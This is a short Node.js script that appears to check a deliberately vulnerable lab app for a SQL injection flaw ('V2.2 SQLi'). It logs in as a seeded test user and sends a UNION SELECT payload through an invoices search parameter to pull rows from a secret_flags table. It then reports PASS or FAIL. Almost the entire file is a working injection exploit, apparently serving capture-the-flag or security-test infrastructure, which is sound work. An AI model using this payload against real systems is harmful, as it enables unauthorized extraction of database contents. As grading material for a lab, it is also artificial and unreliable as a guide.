#!/usr/bin/env node
/** V2.2 SQLi — UNION extract secret_flags (works with seed or planter-rotated flags) */
import { extractFlag, isValidFlag } from '../../../packages/shared/dist/index.js';

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const base = arg('base', 'http://127.0.0.1:3011').replace(/\/$/, '');

const login = await fetch(`${base}/api/login`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'alice', password: 'alice123' }),
}).then((r) => r.json());

const q = "' UNION SELECT id, name, 0, 'open', value FROM secret_flags--";
const url = `${base}/api/invoices?q=${encodeURIComponent(q)}`;
const res = await fetch(url, {
  headers: { Authorization: `Bearer ${login.token}` },
});
const text = await res.text();
console.log('status', res.status);
console.log(text.slice(0, 400));

let flag = null;
try {
  const data = JSON.parse(text);
  const row = data.invoices?.find((i) => i.title === 'sqli_flag');
  if (row) flag = extractFlag(JSON.stringify(row));
} catch {
  /* ignore */
}
if (!flag) flag = extractFlag(text);

if (!flag || !isValidFlag(flag)) {
  console.error('FAIL: SQLi did not return secret_flags flag');
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V2.2 SQLi');
